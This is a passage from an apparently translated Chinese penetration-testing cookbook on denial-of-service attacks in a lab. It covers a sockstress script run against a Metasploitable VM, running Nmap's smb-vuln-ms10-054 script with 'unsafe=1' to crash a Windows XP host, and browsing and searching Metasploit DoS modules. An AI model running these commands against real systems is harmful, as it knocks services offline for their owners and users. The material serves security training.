+</code></pre><p>&#x901A;&#x8FC7;&#x8FDE;&#x7EED;&#x4F7F;&#x7528;<code>free</code> &#x5DE5;&#x5177;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x7CFB;&#x7EDF;&#x7684;&#x53EF;&#x7528;&#x5185;&#x5B58;&#x9010;&#x6E10;&#x8017;&#x5C3D;&#x3002; &#x4E00;&#x65E6;&#x5185;&#x5B58;&#x7A7A;&#x95F2;&#x503C;&#x4E0B;&#x964D;&#x5230;&#x51E0;&#x4E4E;&#x6CA1;&#x6709;&#xFF0C;&#x7A7A;&#x95F2;&#x7F13;&#x51B2;&#x533A;/&#x7F13;&#x5B58;&#x7A7A;&#x95F4;&#x5C06;&#x5F00;&#x59CB;&#x4E0B;&#x964D;&#xFF1A;</p>
+<pre><code>msfadmin@metasploitable:~$ free -m             
+             total       used       free     shared    buffers     cached 
+Mem:           503        498          4          0          0          
+5 -/+ buffers/cache:        493         10 
+Swap:            0          0          0
+</code></pre><p>&#x5728;&#x672C;&#x5730;&#x7CFB;&#x7EDF;&#x4E0A;&#x7684;&#x6240;&#x6709;&#x8D44;&#x6E90;&#x8017;&#x5C3D;&#x4E4B;&#x540E;&#xFF0C;&#x7CFB;&#x7EDF;&#x6700;&#x7EC8;&#x4F1A;&#x5D29;&#x6E83;&#x3002; &#x5B8C;&#x6210;&#x6B64;&#x8FC7;&#x7A0B;&#x6240;&#x9700;&#x7684;&#x65F6;&#x95F4;&#x5C06;&#x53D6;&#x51B3;&#x4E8E;&#x53EF;&#x7528;&#x7684;&#x672C;&#x5730;&#x8D44;&#x6E90;&#x91CF;&#x3002; &#x5728;&#x8FD9;&#x91CC;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x8FD9;&#x662F;&#x5728;&#x5177;&#x6709; 512 MB RAM &#x7684; Metasploitable VM &#x4E0A;&#x6267;&#x884C;&#x7684;&#xFF0C;&#x653B;&#x51FB;&#x82B1;&#x8D39;&#x4E86;&#x5927;&#x7EA6; 2 &#x5206;&#x949F;&#x6765;&#x8017;&#x5C3D;&#x6240;&#x6709;&#x53EF;&#x7528;&#x7684;&#x672C;&#x5730;&#x8D44;&#x6E90;&#x5E76;&#x4F7F;&#x670D;&#x52A1;&#x5668;&#x5D29;&#x6E83;&#x3002; &#x670D;&#x52A1;&#x5668;&#x5D29;&#x6E83;&#x540E;&#xFF0C;&#x6216;&#x8005;&#x4F60;&#x5E0C;&#x671B;&#x505C;&#x6B62; DoS &#x653B;&#x51FB;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x6309;<code>Ctrl + C</code>&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./sock_stress.py 172.16.36.131 21 20
+
+The onslaught has begun...use Ctrl+C to stop the attack
+^C 
+pressed Ctrl+C! 
+Fixing IP Tables
+</code></pre><p>&#x811A;&#x672C;&#x88AB;&#x7F16;&#x5199;&#x6765;&#x6355;&#x83B7;&#x7531;&#x4E8E;&#x6309;<code>Ctrl + C</code>&#x800C;&#x53D1;&#x9001;&#x7684;&#x7EC8;&#x6B62;&#x4FE1;&#x53F7;&#xFF0C;&#x5E76;&#x4E14;&#x5B83;&#x5C06;&#x901A;&#x8FC7;&#x53BB;&#x9664;&#x5728;&#x7EC8;&#x6B62;&#x811A;&#x672C;&#x7684;&#x6267;&#x884C;&#x5E8F;&#x5217;&#x4E4B;&#x524D;&#x751F;&#x6210;&#x7684;&#x89C4;&#x5219;,&#x6765;&#x4FEE;&#x590D;&#x672C;&#x5730; iptables&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x5728; sockstress DoS &#x4E2D;&#xFF0C;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x4E2D;&#x7684;&#x6700;&#x540E;&#x7684; ACK &#x5C01;&#x5305;&#x7684;&#x7A97;&#x53E3;&#x503C;&#x4E3A; 0&#x3002;&#x7531;&#x4E8E;&#x8FDE;&#x63A5;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x7A7A;&#x7A97;&#x53E3;&#x6240;&#x793A;&#xFF0C;&#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#x4E0D;&#x4F1A;&#x4F20;&#x9001;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x6765;&#x54CD;&#x5E94;&#x8FDE;&#x63A5;&#x3002; &#x76F8;&#x53CD;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x4FDD;&#x5B58;&#x8981;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x4F20;&#x8F93;&#x7684;&#x6570;&#x636E;&#x3002; &#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x8FDE;&#x63A5;&#x5145;&#x65A5;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x8017;&#x5C3D;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x5305;&#x62EC;&#x5185;&#x5B58;&#xFF0C;&#x4EA4;&#x6362;&#x7A7A;&#x95F4;&#x548C;&#x8BA1;&#x7B97;&#x80FD;&#x529B;&#x3002;</p>
+<h2 id="69-&#x4F7F;&#x7528;-nmap-nse-&#x6267;&#x884C;-dos-&#x653B;&#x51FB;">6.9 &#x4F7F;&#x7528; Nmap NSE &#x6267;&#x884C; DoS &#x653B;&#x51FB;</h2>
+<p>Nmap &#x811A;&#x672C;&#x5F15;&#x64CE;&#xFF08;NSE&#xFF09;&#x62E5;&#x6709;&#x8BB8;&#x591A;&#x53EF;&#x7528;&#x4E8E;&#x6267;&#x884C; DoS &#x653B;&#x51FB;&#x7684;&#x811A;&#x672C;&#x3002; &#x8FD9;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x79D8;&#x7C4D;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x627E;&#x5230; NSE DoS &#x811A;&#x672C;&#xFF0C;&#x786E;&#x5B9A;&#x811A;&#x672C;&#x7684;&#x7528;&#x6CD5;&#xFF0C;&#x4EE5;&#x53CA;&#x5982;&#x4F55;&#x6267;&#x884C;&#x5B83;&#x4EEC;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x4F7F;&#x7528; Nmap NSE &#x6267;&#x884C; DoS &#x653B;&#x51FB;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x5B83;&#x6613;&#x53D7; Nmap NSE DoS &#x811A;&#x672C;&#x4E4B;&#x4E00;&#x7684;&#x653B;&#x51FB;&#x3002; &#x6240;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4F7F;&#x7528; Windows XP &#x7684;&#x5B9E;&#x4F8B;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x5728;&#x4F7F;&#x7528; Nmap NSE &#x811A;&#x672C;&#x6267;&#x884C; DoS &#x6D4B;&#x8BD5;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x786E;&#x5B9A;&#x54EA;&#x4E9B; DoS &#x811A;&#x672C;&#x53EF;&#x7528;&#x3002; &#x5728; Nmap NSE &#x811A;&#x672C;&#x76EE;&#x5F55;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;<code>greppable script.db</code>&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x786E;&#x5B9A;&#x4EFB;&#x4F55;&#x7ED9;&#x5B9A;&#x7C7B;&#x522B;&#x4E2D;&#x7684;&#x811A;&#x672C;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# grep dos /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot;&quot; -f 2 
+broadcast-avahi-dos.nse 
+http-slowloris.nse ipv6-ra-flood.nse
+smb-check-vulns.nse 
+smb-flood.nse 
+smb-vuln-ms10-054.nse
+</code></pre><p>&#x901A;&#x8FC7;&#x4ECE;<code>script.db</code>&#x6587;&#x4EF6;&#x4E2D;&#x4F7F;&#x7528;<code>grep</code>&#x641C;&#x7D22; DoS&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8F93;&#x51FA;&#x901A;&#x8FC7;&#x7BA1;&#x9053;&#x4F20;&#x9012;&#x5230;<code>cut</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x63D0;&#x53D6;&#x53EF;&#x7528;&#x7684;&#x811A;&#x672C;&#x3002; &#x901A;&#x8FC7;&#x9605;&#x8BFB;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x7684;&#x5934;&#x90E8;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x5E38;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x5F88;&#x591A;&#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# cat /usr/share/nmap/scripts/smb-vuln-ms10-054.nse | more 
+local bin = require &quot;bin&quot; 
+local msrpc = require &quot;msrpc&quot; 
+local smb = require &quot;smb&quot; 
+local string = require &quot;string&quot; 
+local vulns = require &quot;vulns&quot; 
+local stdnse = require &quot;stdnse&quot;
+
+description = [[ 
+Tests whether target machines are vulnerable to the ms10-054 SMB remote memory 
+corruption vulnerability.
+
+The vulnerable machine will crash with BSOD. 
+
+The script requires at least READ access right to a share on a remote machine. 
+Either with guest credentials or with specified username/password.
+</code></pre><p>&#x4E3A;&#x4E86;&#x4ECE;&#x4E0A;&#x5230;&#x4E0B;&#x8BFB;&#x53D6;&#x811A;&#x672C;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x5BF9;&#x6587;&#x4EF6;&#x4F7F;&#x7528;<code>cat</code>&#x547D;&#x4EE4;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x7BA1;&#x9053;&#x8F93;&#x51FA;&#x5230;<code>more</code>&#x5DE5;&#x5177;&#x3002; &#x811A;&#x672C;&#x7684;&#x5934;&#x90E8;&#x63CF;&#x8FF0;&#x4E86;&#x5B83;&#x6240;&#x5229;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#x4EE5;&#x53CA;&#x7CFB;&#x7EDF;&#x5FC5;&#x987B;&#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x3002; &#x5B83;&#x8FD8;&#x89E3;&#x91CA;&#x4E86;&#x8BE5;&#x6F0F;&#x6D1E;&#x5C06;&#x5BFC;&#x81F4;&#x84DD;&#x5C4F;&#x6B7B;&#x673A;&#xFF08;BSOD&#xFF09;DoS&#x3002; &#x901A;&#x8FC7;&#x8FDB;&#x4E00;&#x6B65;&#x5411;&#x4E0B;&#x6EDA;&#x52A8;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x66F4;&#x591A;&#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;&#xFF1A;</p>
+<pre><code>-- @usage nmap  -p 445 &lt;target&gt; 
+--script=smb-vuln-ms10-054 
+--script-args unsafe 
+--- @args unsafe Required to run the script, &quot;safty swich&quot; to prevent running it by accident 
+-- @args smb-vuln-ms10-054.share Share to connect to (defaults to SharedDocs)
+
+-- @usage nmap  -p 445 &lt;target&gt; 
+--script=smb-vuln-ms10-054 
+--script-args unsafe 
+--- @args unsafe Required to run the script, &quot;safty swich&quot; to prevent running it by accident 
+-- @args smb-vuln-ms10-054.share Share to connect to (defaults to SharedDocs)
+
+
+-- @output 
+-- Host script results: 
+-- | smb-vuln-ms10-054: 
+-- |   VULNERABLE: 
+-- |   SMB remote memory corruption vulnerability 
+-- |     State: VULNERABLE 
+-- |     IDs:  CVE:CVE-2010-2550 
+-- |     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/ A:C) 
+-- |     Description: 
+-- |       The SMB Server in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2, 
+-- |       Windows Vista SP1 and SP2, Windows Server 2008 Gold, SP2, and R2, and Windows 7 
+-- |       does not properly validate fields in an SMB request, which allows remote attackers 
+-- |       to execute arbitrary code via a crafted SMB packet, aka &quot;SMB Pool Overflow Vulnerability.&quot;
+</code></pre><p>&#x5728;&#x811A;&#x672C;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x811A;&#x672C;&#x7528;&#x6CD5;&#x548C;&#x811A;&#x672C;&#x63D0;&#x4F9B;&#x7684;&#x53C2;&#x6570;&#x7684;&#x63CF;&#x8FF0;&#x3002; &#x5B83;&#x8FD8;&#x63D0;&#x4F9B;&#x4E86;&#x6709;&#x5173;&#x5176;&#x5229;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#x7684;&#x5176;&#x4ED6;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#x3002; &#x8981;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728; Nmap &#x4E2D;&#x4F7F;&#x7528;<code>--script</code>&#x9009;&#x9879;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# nmap -p 445 172.16.36.134 --script=smb-vuln-ms10-054 --script-args unsafe=1
+
+Starting Nmap 6.25 ( http://nmap.org ) at 2014-02-28 23:45 EST 
+Nmap scan report for 172.16.36.134 
+Host is up (0.00038s latency). 
+PORT    STATE SERVICE 
+445/tcp open  microsoft-ds 
+MAC Address: 00:0C:29:18:11:FB (VMware)
+
+Host script results: 
+| smb-vuln-ms10-054: 
+|   VULNERABLE: 
+|   SMB remote memory corruption vulnerability 
+|     State: VULNERABLE 
+|     IDs:  CVE:CVE-2010-2550
+|     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C) 
+|     Description: 
+|       The SMB Server in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2, 
+|       Windows Vista SP1 and SP2, Windows Server 2008 Gold, SP2, and R2, and Windows 7 
+|       does not properly validate fields in an SMB request, which allows remote attackers 
+|       to execute arbitrary code via a crafted SMB packet, aka &quot;SMB Pool Overflow Vulnerability.&quot;
+</code></pre><p>&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;Nmap &#x88AB;&#x5B9A;&#x5411;&#x4E3A;&#x4EC5;&#x626B;&#x63CF; TCP &#x7AEF;&#x53E3; 445&#xFF0C;&#x8FD9;&#x662F;&#x8BE5;&#x6F0F;&#x6D1E;&#x7684;&#x76F8;&#x5173;&#x7AEF;&#x53E3;&#x3002; <code>--script</code>&#x9009;&#x9879;&#x4E0E;&#x6307;&#x5B9A;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x811A;&#x672C;&#x7684;&#x53C2;&#x6570;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#x3002; &#x6211;&#x4EEC;&#x4F20;&#x9012;&#x4E86;&#x5355;&#x4E2A;&#x811A;&#x672C;&#x53C2;&#x6570;&#x6765;&#x8868;&#x660E;&#x53EF;&#x4EE5;&#x63A5;&#x53D7;&#x4E0D;&#x5B89;&#x5168;&#x626B;&#x63CF;&#x3002; &#x6B64;&#x53C2;&#x6570;&#x7684;&#x63CF;&#x8FF0;&#x662F;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x6388;&#x6743; DoS &#x653B;&#x51FB;&#x7684;&#x5B89;&#x5168;&#x5F00;&#x5173;&#x3002; &#x5728; Nmap &#x4E2D;&#x6267;&#x884C;&#x811A;&#x672C;&#x540E;&#xFF0C;&#x8F93;&#x51FA;&#x8868;&#x660E;&#x7CFB;&#x7EDF;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x3002; &#x67E5;&#x770B; Windows XP &#x673A;&#x5668;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; DoS &#x6210;&#x529F;&#xFF0C;&#x8FD9;&#x5BFC;&#x81F4;&#x4E86;&#x84DD;&#x5C4F;&#xFF1A;</p>
+<p><img src="img/6-9-1.jpg" alt=""></p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x672C;&#x7EC3;&#x4E60;&#x4E2D;&#x6F14;&#x793A;&#x7684; Nmap NSE &#x811A;&#x672C;&#x662F;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x653B;&#x51FB;&#x7684;&#x793A;&#x4F8B;&#x3002; &#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x80FD;&#x591F;&#x5BFC;&#x81F4;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4EEC;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4EFB;&#x610F;&#x6570;&#x636E;&#x88AB;&#x52A0;&#x8F7D;&#x5230;&#x975E;&#x9884;&#x671F;&#x7684;&#x5185;&#x5B58;&#x6BB5;&#x3002; &#x8FD9;&#x53EF;&#x80FD;&#x4E2D;&#x65AD;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF0C;&#x5E76;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x6216;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x3002;</p>
+<h2 id="610-metasploit-dos-&#x653B;&#x51FB;">6.10 Metasploit DoS &#x653B;&#x51FB;</h2>
+<p>Metasploit&#x6846;&#x67B6;&#x6709;&#x8BB8;&#x591A;&#x8F85;&#x52A9;&#x6A21;&#x5757;&#x811A;&#x672C;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x6267;&#x884C; DoS &#x653B;&#x51FB;&#x3002; &#x8FD9;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x79D8;&#x7C4D;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x627E;&#x5230; DoS &#x6A21;&#x5757;&#xFF0C;&#x786E;&#x5B9A;&#x6A21;&#x5757;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x5F0F;&#xFF0C;&#x4EE5;&#x53CA;&#x5982;&#x4F55;&#x6267;&#x884C;&#x5B83;&#x4EEC;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x4F7F;&#x7528; Metasploit &#x6267;&#x884C; DoS &#x653B;&#x51FB;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x5B83;&#x6613;&#x53D7; Metasploit DoS &#x8F85;&#x52A9;&#x6A21;&#x5757;&#x4E4B;&#x4E00;&#x7684;&#x653B;&#x51FB;&#x3002; &#x6240;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4F7F;&#x7528; Windows XP &#x7684;&#x5B9E;&#x4F8B;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x5728;&#x4F7F;&#x7528; Metasploit &#x8F85;&#x52A9;&#x6A21;&#x5757;&#x6267;&#x884C; DoS &#x6D4B;&#x8BD5;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x786E;&#x5B9A;&#x54EA;&#x4E9B; DoS &#x6A21;&#x5757;&#x53EF;&#x7528;&#x3002; &#x76F8;&#x5173;&#x6A21;&#x5757;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6D4F;&#x89C8; Metasploit &#x76EE;&#x5F55;&#x6811;&#x6765;&#x786E;&#x5B9A;&#xFF1A;</p>
+<pre><code>
+root@KaliLinux:~# cd /usr/share/metasploit-framework/modules/auxiliary/ dos/ 
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos# ls cisco  dhcp  freebsd  hp  http  mdns  ntp  pptp  samba  scada  smtp  solaris  ssl  syslog  tcp  wifi  windows  wireshark 
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos# cd windows/ 
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows# ls appian  browser  ftp  games  http  llmnr  nat  rdp  smb  smtp  tftp 
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows# cd http 
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows/http# ls ms10_065_ii6_asp_dos.rb  
+pi3web_isapi.rb
+</code></pre><p>&#x901A;&#x8FC7;&#x6D4F;&#x89C8;<code>/ modules / auxiliary / dos</code>&#x76EE;&#x5F55;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5404;&#x79CD;&#x7C7B;&#x522B;&#x7684; DoS &#x6A21;&#x5757;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5DF2;&#x6D4F;&#x89C8;&#x5305;&#x542B; Windows HTTP &#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x6F0F;&#x6D1E;&#x7684;&#x76EE;&#x5F55;&#xFF1A;</p>
+<pre><code>root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows/http# cat ms10_065_ii6_asp_dos.rb | more 
+## 
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit 
+# web site for more information on licensing and terms of use. 
+#   http://metasploit.com/ 
+##
+
+require &apos;msf/core&apos;
+
+class Metasploit3 &lt; Msf::Auxiliary
+
+   include Msf::Exploit::Remote::Tcp   
+   include Msf::Auxiliary::Dos
+
+   def initialize(info = {})      
+   super(update_info(info,         
+        &apos;Name&apos;           =&gt; &apos;Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service&apos;,         
+        &apos;Description&apos;    =&gt; %q{               
+            The vulnerability allows remote unauthenticated attackers to force the IIS server            
+            to become unresponsive until the IIS service is restarted manually by the administrator.            
+            Required is that Active Server Pages are hosted by the IIS and that an ASP script reads            
+            out a Post Form value.         
+        },         
+        &apos;Author&apos;         =&gt;            
+            [               
+                &apos;Alligator Security Team&apos;,               
+                &apos;Heyder Andrade &lt;heyder[at]alligatorteam.org&gt;&apos;,               
+                &apos;Leandro Oliveira &lt;leadro[at]alligatorteam.org&gt;&apos;            
+            ],         
+        &apos;License&apos;        =&gt; MSF_LICENSE,         
+        &apos;References&apos;     =&gt;            
+            [               
+                [ &apos;CVE&apos;, &apos;2010-1899&apos; ],               
+                [ &apos;OSVDB&apos;, &apos;67978&apos;],               
+                [ &apos;MSB&apos;, &apos;MS10-065&apos;],               
+                [ &apos;EDB&apos;, &apos;15167&apos; ]            
+            ],         
+        &apos;DisclosureDate&apos; =&gt; &apos;Sep 14 2010&apos;))
+</code></pre><p>&#x4E3A;&#x4E86;&#x4ECE;&#x4E0A;&#x5230;&#x4E0B;&#x8BFB;&#x53D6;&#x811A;&#x672C;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x5BF9;&#x6587;&#x4EF6;&#x4F7F;&#x7528;<code>cat</code>&#x547D;&#x4EE4;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x7BA1;&#x9053;&#x8F93;&#x51FA;&#x5230;<code>more</code>&#x5DE5;&#x5177;&#x3002; &#x811A;&#x672C;&#x7684;&#x9876;&#x90E8;&#x63CF;&#x8FF0;&#x4E86;&#x5B83;&#x6240;&#x5229;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#x4EE5;&#x53CA;&#x7CFB;&#x7EDF;&#x5FC5;&#x987B;&#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x3002; &#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x5728; Metasploit &#x6846;&#x67B6;&#x63A7;&#x5236;&#x53F0;&#x4E2D;&#x8BC6;&#x522B;&#x6F5C;&#x5728;&#x7684; DoS &#x6F0F;&#x6D1E;&#x3002; &#x8981;&#x8BBF;&#x95EE;&#x5B83;&#xFF0C;&#x5728;&#x7EC8;&#x7AEF;&#x4E2D;&#x952E;&#x5165;<code>msfconsole</code>&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# msfconsole # cowsay++
+ ____________
+&lt; metasploit &gt; 
+ -----------       
+       \   ,__,        
+        \  (oo)____           
+           (__)    )\              
+              ||--|| *
+
+Large pentest? List, sort, group, tag and search your hosts and services in Metasploit Pro -- type &apos;go_pro&apos; to launch it now.
+
+       =[ metasploit v4.6.0-dev [core:4.6 api:1.0] 
++ -- --=[ 1053 exploits - 590 auxiliary - 174 post 
++ -- --=[ 275 payloads - 28 encoders - 8 nops
+
+msf &gt;
+</code></pre><p>&#x4E00;&#x65E6;&#x6253;&#x5F00;&#xFF0C;&#x641C;&#x7D22;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x4E0E;&#x641C;&#x7D22;&#x9879;&#x7ED3;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x6765;&#x786E;&#x5B9A;&#x8981;&#x4F7F;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#xFF1A;</p>
+<pre><code>msf &gt; search dos
+
+Matching Modules 
+================
+
+   Name                                                        Disclosure Date  Rank       Description   ----                                                        --------------  ----       ----------
+   auxiliary/admin/webmin/edit_html_fileaccess                 2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access   
+   auxiliary/dos/cisco/ios_http_percentpercent                 2000-04-26       normal     Cisco IOS HTTP GET /%% request Denial of Service   
+   auxiliary/dos/dhcp/isc_dhcpd_clientid                                        normal     ISC DHCP Zero Length ClientID Denial of Service Module   
+   auxiliary/dos/freebsd/nfsd/nfsd_mount                                        normal     FreeBSD Remote NFS RPC Request Denial of Service   
+   auxiliary/dos/hp/data_protector_rds                         2011-01-08       manual     HP Data Protector Manager RDS DOS   
+   auxiliary/dos/http/3com_superstack_switch                   2004-06-24       normal     3Com SuperStack Switch Denial of Service   
+   auxiliary/dos/http/apache_mod_isapi                         2010-03-05       normal     Apache mod_isapi &lt;= 2.2.14 Dangling Pointer   
+   auxiliary/dos/http/apache_range_dos                         2011-08-19       normal     Apache Range header DoS (Apache Killer)   
+   auxiliary/dos/http/apache_tomcat_transfer_encoding          2010-07-09       normal     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+</code></pre><p>&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x641C;&#x7D22;&#x9879; dos &#x7528;&#x4E8E;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x3002; &#x8FD4;&#x56DE;&#x4E00;&#x7CFB;&#x5217; DoS &#x8F85;&#x52A9;&#x6A21;&#x5757;&#xFF0C;&#x5E76;&#x4E14;&#x5305;&#x62EC;&#x6BCF;&#x4E2A; DoS &#x8F85;&#x52A9;&#x6A21;&#x5757;&#x7684;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x3002; &#x6B64;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x53EF;&#x7528;&#x4E8E;&#x7F29;&#x5C0F;&#x641C;&#x7D22;&#x7ED3;&#x679C;&#x8303;&#x56F4;&#xFF1A;</p>
+<pre><code>msf &gt; search /dos/windows/smb/
+
+Matching Modules 
+================
+
+   Name                                                        Disclosure Date  Rank    Description   
+   ----                                                        --------------  ----    ----------   
+   auxiliary/dos/windows/smb/ms05_047_pnp                                       normal  Microsoft Plug and Play Service Registry Overflow   
+   auxiliary/dos/windows/smb/ms06_035_mailslot                 2006-07-11       normal  Microsoft SRV.SYS Mailslot Write Corruption   
+   auxiliary/dos/windows/smb/ms06_063_trans                                     normal  Microsoft SRV.SYS Pipe Transaction No Null   
+   auxiliary/dos/windows/smb/ms09_001_write                                     normal  Microsoft SRV.SYS WriteAndX Invalid DataOffset   
